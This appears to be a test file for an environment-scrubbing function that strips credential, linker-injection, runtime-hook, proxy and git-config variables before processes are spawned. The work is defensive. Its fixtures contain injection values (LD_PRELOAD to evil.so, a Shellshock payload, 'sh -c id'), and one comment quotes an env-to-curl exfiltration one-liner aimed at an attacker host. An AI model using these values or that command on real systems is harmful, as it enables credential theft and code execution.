import { describe, expect, test } from 'bun:test';
import { scrubEnv } from '../../src/sanitize/env.ts';

describe('scrubEnv', () => {
  test('drops *_API_KEY by suffix', () => {
    const out = scrubEnv({ ANTHROPIC_API_KEY: 'k', OPENAI_API_KEY: 'k', SAFE: 'v' });
    expect(out).toEqual({ SAFE: 'v' });
  });

  test('drops *_TOKEN, *_SECRET, *_PASSWORD, *_PASS by suffix', () => {
    const out = scrubEnv({
      DATABASE_PASSWORD: 'a',
      SOMETHING_TOKEN: 'b',
      MY_SECRET: 'c',
      ROOT_PASS: 'd',
      KEEP: 'k',
    });
    expect(out).toEqual({ KEEP: 'k' });
  });

  test('drops AWS_*, OPENAI_*, ANTHROPIC_* by prefix', () => {
    const out = scrubEnv({
      AWS_ACCESS_KEY_ID: 'a',
      AWS_SESSION_TOKEN: 'b',
      OPENAI_ORG_ID: 'c',
      ANTHROPIC_BASE_URL: 'd',
      KEEP: 'k',
    });
    expect(out).toEqual({ KEEP: 'k' });
  });

  test('drops specific named tokens (GITHUB_TOKEN, GH_TOKEN, NPM_TOKEN, DOCKER_PASSWORD)', () => {
    const out = scrubEnv({
      GITHUB_TOKEN: 'a',
      GH_TOKEN: 'b',
      NPM_TOKEN: 'c',
      DOCKER_PASSWORD: 'd',
      KEEP: 'k',
    });
    expect(out).toEqual({ KEEP: 'k' });
  });

  test('drops GOOGLE_API_KEY and GEMINI_API_KEY', () => {
    const out = scrubEnv({ GOOGLE_API_KEY: 'a', GEMINI_API_KEY: 'b', KEEP: 'k' });
    expect(out).toEqual({ KEEP: 'k' });
  });

  test('matches case-insensitively', () => {
    const out = scrubEnv({
      anthropic_api_key: 'a',
      Aws_Region: 'b',
      OpenAi_org: 'c',
      KEEP: 'k',
    });
    expect(out).toEqual({ KEEP: 'k' });
  });

  test('drops undefined values silently', () => {
    const env: NodeJS.ProcessEnv = { DEFINED: 'v', MISSING: undefined };
    const out = scrubEnv(env);
    expect(out).toEqual({ DEFINED: 'v' });
  });

  test('preserves PATH, HOME, and other innocuous vars', () => {
    const out = scrubEnv({
      PATH: '/usr/bin',
      HOME: '/home/me',
      LANG: 'en_US.UTF-8',
      USER: 'me',
    });
    expect(out).toEqual({
      PATH: '/usr/bin',
      HOME: '/home/me',
      LANG: 'en_US.UTF-8',
      USER: 'me',
    });
  });

  test('result is a fresh object (no shared reference with input)', () => {
    const env = { KEEP: 'v' };
    const out = scrubEnv(env);
    expect(out).not.toBe(env);
  });

  // Slice 135 P1 sec-1: slice 128 R4 P1 added 7 credential-/
  // session-bearing env vars that don't match the standard
  // suffix patterns. Pin each one so a future regression that
  // shortens the SCRUB_PATTERNS list (or refactors to a single
  // mega-regex) doesn't silently let one through.
  describe('slice 128 R4 P1 — credential/session vars without standard suffix', () => {
    test('drops SSH_AUTH_SOCK (ssh-agent socket path)', () => {
      const out = scrubEnv({ SSH_AUTH_SOCK: '/tmp/ssh-XXX/agent.123', KEEP: 'v' });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops GPG_AGENT_INFO and GNUPGHOME', () => {
      const out = scrubEnv({
        GPG_AGENT_INFO: '/run/user/1000/gnupg/S.gpg-agent:0:1',
        GNUPGHOME: '/home/me/.gnupg-evil',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops KUBECONFIG (k8s credential file path)', () => {
      const out = scrubEnv({ KUBECONFIG: '/home/me/.kube/config', KEEP: 'v' });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops DOCKER_AUTH_CONFIG (base64 registry creds)', () => {
      const out = scrubEnv({ DOCKER_AUTH_CONFIG: 'base64-blob', KEEP: 'v' });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops OP_SESSION_* (1Password CLI per-account sessions)', () => {
      const out = scrubEnv({
        OP_SESSION_account_a: 'session-token-a',
        OP_SESSION_account_b: 'session-token-b',
        OP_session_lower: 'lower-case',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops CLOUDSDK_* (gcloud config + auth tokens)', () => {
      const out = scrubEnv({
        CLOUDSDK_AUTH_ACCESS_TOKEN: 'tok',
        CLOUDSDK_CORE_PROJECT: 'prj',
        cloudsdk_lower_case: 'still-dropped',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('all slice-128 vars together: every one stripped, KEEP survives', () => {
      const out = scrubEnv({
        SSH_AUTH_SOCK: 'a',
        GPG_AGENT_INFO: 'b',
        GNUPGHOME: 'c',
        KUBECONFIG: 'd',
        DOCKER_AUTH_CONFIG: 'e',
        OP_SESSION_x: 'f',
        CLOUDSDK_y: 'g',
        KEEP: 'survive',
      });
      expect(out).toEqual({ KEEP: 'survive' });
    });
  });

  // Slice 142 (review minor): dynamic linker injection. LD_PRELOAD
  // / DYLD_INSERT_LIBRARIES are the canonical defense-in-depth gap
  // — a sandboxed process inheriting them loads the operator's
  // rogue .so as its own library code, bypassing syscall-level
  // sandbox boundaries.
  describe('slice 142 — dynamic linker / askpass scrub', () => {
    test('drops LD_PRELOAD / LD_LIBRARY_PATH / LD_AUDIT (Linux linker injection)', () => {
      const out = scrubEnv({
        LD_PRELOAD: '/tmp/evil.so',
        LD_LIBRARY_PATH: '/tmp/evil-lib',
        LD_AUDIT: '/tmp/audit.so',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops DYLD_INSERT_LIBRARIES / DYLD_FALLBACK_LIBRARY_PATH / DYLD_LIBRARY_PATH (macOS linker)', () => {
      const out = scrubEnv({
        DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib',
        DYLD_FALLBACK_LIBRARY_PATH: '/tmp/evil',
        DYLD_LIBRARY_PATH: '/tmp/lib',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops SUDO_ASKPASS (credential-prompt helper hijack)', () => {
      const out = scrubEnv({ SUDO_ASKPASS: '/tmp/evil-prompt', KEEP: 'v' });
      expect(out).toEqual({ KEEP: 'v' });
    });
  });

  // Slice 146 (review minor): runtime injection vectors one level
  // above the dynamic linker — language startup hooks (NODE_OPTIONS,
  // PYTHONPATH, RUBYOPT, PERL5OPT, BASH_ENV) and credential /
  // egress redirect (HTTP_PROXY, DBUS_SESSION_BUS_ADDRESS,
  // XDG_RUNTIME_DIR). Defense in depth: the bwrap kernel allowlist
  // (slice 145 S2) handles SANDBOXED processes; this list handles
  // host-profile / non-sandboxed spawn sites + any future spawn
  // site that bypasses the runner.
  describe('slice 146 — application-runtime injection points', () => {
    test('drops NODE_OPTIONS (Node --require injection)', () => {
      const out = scrubEnv({ NODE_OPTIONS: '--require /tmp/x.js', KEEP: 'v' });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops PYTHONPATH / PYTHONSTARTUP / PYTHONUSERBASE', () => {
      const out = scrubEnv({
        PYTHONPATH: '/tmp/py',
        PYTHONSTARTUP: '/tmp/start.py',
        PYTHONUSERBASE: '/tmp/userbase',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops RUBYOPT / RUBYLIB', () => {
      const out = scrubEnv({
        RUBYOPT: '-rmodule',
        RUBYLIB: '/tmp/rb',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops PERL5OPT / PERL5LIB / PERL5DB', () => {
      const out = scrubEnv({
        PERL5OPT: '-d:Module=arg',
        PERL5LIB: '/tmp/perl',
        PERL5DB: 'BEGIN{system("id")}',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops BASH_ENV / ENV / PROMPT_COMMAND', () => {
      const out = scrubEnv({
        BASH_ENV: '/tmp/bashenv',
        ENV: '/tmp/env',
        PROMPT_COMMAND: 'echo pwned',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops BASH_FUNC_* (Shellshock surface)', () => {
      // `BASH_FUNC_foo%%` is the canonical Shellshock injection
      // shape; any var starting with BASH_FUNC_ is suspect.
      const out = scrubEnv({
        'BASH_FUNC_x%%': '() { :; }; id',
        BASH_FUNC_legitimate: 'something',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops HTTP_PROXY / HTTPS_PROXY / ALL_PROXY (case-insensitive)', () => {
      // curl honors lowercase forms; uppercase + lowercase both.
      const out = scrubEnv({
        HTTP_PROXY: 'http://attacker.example.com',
        HTTPS_PROXY: 'http://attacker.example.com',
        ALL_PROXY: 'socks5://attacker.example.com:1080',
        http_proxy: 'http://attacker.example.com',
        https_proxy: 'http://attacker.example.com',
        all_proxy: 'socks5://attacker.example.com',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops DBUS_SESSION_BUS_ADDRESS / XDG_RUNTIME_DIR (host service access)', () => {
      const out = scrubEnv({
        DBUS_SESSION_BUS_ADDRESS: 'unix:path=/run/user/1000/bus',
        XDG_RUNTIME_DIR: '/run/user/1000',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('NO_PROXY survives (exclusion list, not redirect)', () => {
      // NO_PROXY is an allow-list of hosts that bypass the proxy,
      // not a redirect vector. Defensible to keep.
      const out = scrubEnv({ NO_PROXY: 'localhost,127.0.0.1', KEEP: 'v' });
      expect(out).toEqual({ NO_PROXY: 'localhost,127.0.0.1', KEEP: 'v' });
    });
    test('PATH / HOME / USER / TERM still survive (control: scope discipline)', () => {
      // Make sure the new patterns don't accidentally over-match
      // legitimate vars. Common-name vars must still pass.
      const out = scrubEnv({
        PATH: '/usr/bin',
        HOME: '/home/op',
        USER: 'op',
        TERM: 'xterm',
      });
      expect(out).toEqual({
        PATH: '/usr/bin',
        HOME: '/home/op',
        USER: 'op',
        TERM: 'xterm',
      });
    });
  });

  // Slice 129 (R5 P0-3): GIT_CONFIG_* env vars bypass the slice 128
  // `-c` argv refuse path. Confirm every git-config-via-env shape
  // is scrubbed.
  describe('slice 129 — git config via env', () => {
    test('drops GIT_CONFIG_PARAMETERS', () => {
      const out = scrubEnv({
        GIT_CONFIG_PARAMETERS: "'core.sshCommand=sh -c id'",
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops indexed GIT_CONFIG_COUNT / KEY / VALUE', () => {
      const out = scrubEnv({
        GIT_CONFIG_COUNT: '1',
        GIT_CONFIG_KEY_0: 'core.sshCommand',
        GIT_CONFIG_VALUE_0: 'sh -c id',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops GIT_SSH / GIT_SSH_COMMAND / GIT_PAGER / GIT_EDITOR / GIT_PROXY_COMMAND', () => {
      const out = scrubEnv({
        GIT_SSH: '/tmp/evil',
        GIT_SSH_COMMAND: 'sh -c id',
        GIT_PAGER: 'sh -c id',
        GIT_EDITOR: 'sh -c id',
        GIT_PROXY_COMMAND: 'sh -c id',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
    test('drops GIT_EXTERNAL_DIFF and GIT_TEMPLATE_DIR', () => {
      const out = scrubEnv({
        GIT_EXTERNAL_DIFF: '/tmp/evil',
        GIT_TEMPLATE_DIR: '/tmp/templates',
        KEEP: 'v',
      });
      expect(out).toEqual({ KEEP: 'v' });
    });
  });
});

// Slice 162 (review — env scrub expansion). The 5-axis security
// review flagged ad-hoc credential vars escaping the denylist: shape
// patterns like `_KEY` / `_AUTH` / `_SESSION` weren't generic enough,
// and service-specific names (VAULT_*, BW_*, LASTPASS_*, OP_CONNECT_*)
// had no coverage. Pre-slice, a model emitting `bash "env | base64 |
// curl https://attacker"` from a darwin or host-profile path could
// exfil any of these. The macOS sandbox-exec parity wire (separate
// part of slice 162) closes the sandboxed path; these patterns close
// the host / degraded path.
describe('scrubEnv — slice 162 expansion', () => {
  test('drops *_KEY suffix (catches PRIVATE_KEY, SECRET_KEY, ENCRYPTION_KEY)', () => {
    const out = scrubEnv({
      PRIVATE_KEY: 'a',
      SECRET_KEY: 'b',
      ENCRYPTION_KEY: 'c',
      API_KEY: 'd',
      KEEP: 'v',
    });
    expect(out).toEqual({ KEEP: 'v' });
  });

  test('drops *_AUTH, *_BEARER, *_CRED, *_CREDS, *_SESSION, *_COOKIE suffixes', () => {
    const out = scrubEnv({
      REGISTRY_AUTH: 'a',
      ACCESS_BEARER: 'b',
      GCLOUD_CRED: 'c',
      AWS_CREDS: 'd',
      AUTH_SESSION: 'e',
      AUTH_COOKIE: 'f',
      KEEP: 'v',
    });
    expect(out).toEqual({ KEEP: 'v' });
  });

  test('drops VAULT_* prefix (HashiCorp Vault)', () => {
    const out = scrubEnv({
      VAULT_TOKEN: 'a',
      VAULT_ADDR: 'https://vault.internal',
      VAULT_NAMESPACE: 'ns',
      KEEP: 'v',
    });
    expect(out).toEqual({ KEEP: 'v' });
  });

  test('drops BW_* prefix (Bitwarden CLI)', () => {
    const out = scrubEnv({
      BW_SESSION: 'session-token',
      BW_CLIENTID: 'client',
      BW_CLIENTSECRET: 'secret',
      KEEP: 'v',
    });
    expect(out).toEqual({ KEEP: 'v' });
  });

  test('drops LPASS_*, LASTPASS_* prefixes (LastPass CLI)', () => {
    const out = scrubEnv({
      LPASS_AGENT_TIMEOUT: '3600',
      LASTPASS_USER: 'op@example.com',
      KEEP: 'v',
    });
    expect(out).toEqual({ KEEP: 'v' });
  });

  test('drops OP_CONNECT_* prefix (1Password Connect)', () => {
    const out = scrubEnv({
      OP_CONNECT_TOKEN: 'connect-token',
      OP_CONNECT_HOST: 'https://op-connect.internal',
      KEEP: 'v',
    });
    expect(out).toEqual({ KEEP: 'v' });
  });

  test('drops DOPPLER_TOKEN, INFISICAL_TOKEN (secret managers)', () => {
    const out = scrubEnv({
      DOPPLER_TOKEN: 'a',
      INFISICAL_TOKEN: 'b',
      KEEP: 'v',
    });
    expect(out).toEqual({ KEEP: 'v' });
  });

  test('drops TWILIO_ACCOUNT_SID (half of Twilio auth pair)', () => {
    // Pre-slice the suffix-based patterns missed account-SID style
    // identifiers because `_SID` is not a credential-shape suffix
    // by convention. Service-specific entry.
    const out = scrubEnv({
      TWILIO_ACCOUNT_SID: 'ACxxx',
      KEEP: 'v',
    });
    expect(out).toEqual({ KEEP: 'v' });
  });

  test('case-insensitive matching for new patterns', () => {
    const out = scrubEnv({
      vault_token: 'a',
      Bw_Session: 'b',
      lastpass_USER: 'c',
      KEEP: 'v',
    });
    // BW_ is case-sensitive (no /i flag — exact prefix). vault_token
    // and lastpass_USER are case-insensitive.
    expect(out.KEEP).toBe('v');
    expect(out.vault_token).toBeUndefined();
    expect(out.lastpass_USER).toBeUndefined();
    // Bw_Session: BW_ pattern is case-sensitive, doesn't match. But
    // _SESSION suffix (case-insensitive) catches it.
    expect(out.Bw_Session).toBeUndefined();
  });

  test('regression: legitimate non-credential vars still pass', () => {
    // The expansion should NOT scrub common dev / locale / runtime
    // vars. This pins backward compat.
    const out = scrubEnv({
      PATH: '/usr/bin',
      HOME: '/home/op',
      USER: 'op',
      TERM: 'xterm-256color',
      LANG: 'en_US.UTF-8',
      EDITOR: 'vim',
      PAGER: 'less',
      TZ: 'America/Sao_Paulo',
      CI: 'true',
      NODE_ENV: 'production',
      RUST_LOG: 'debug',
      CARGO_HOME: '/.cargo',
      GOPATH: '/go',
      JAVA_HOME: '/usr/lib/jvm/openjdk',
      // Edge: contains "TOKEN" but not as a suffix word
      MY_TOKENIZER_PATH: '/opt/tok',
      // Edge: contains "AUTH" but not as a suffix
      OAUTH_REDIRECT_URI: 'https://app/callback',
    });
    // None of these credential-adjacent-but-not-credential vars
    // should be dropped.
    expect(out.PATH).toBe('/usr/bin');
    expect(out.HOME).toBe('/home/op');
    expect(out.EDITOR).toBe('vim');
    expect(out.PAGER).toBe('less');
    expect(out.CI).toBe('true');
    expect(out.NODE_ENV).toBe('production');
    expect(out.RUST_LOG).toBe('debug');
    expect(out.CARGO_HOME).toBe('/.cargo');
    expect(out.GOPATH).toBe('/go');
    expect(out.JAVA_HOME).toBe('/usr/lib/jvm/openjdk');
    expect(out.MY_TOKENIZER_PATH).toBe('/opt/tok');
    expect(out.OAUTH_REDIRECT_URI).toBe('https://app/callback');
  });
});
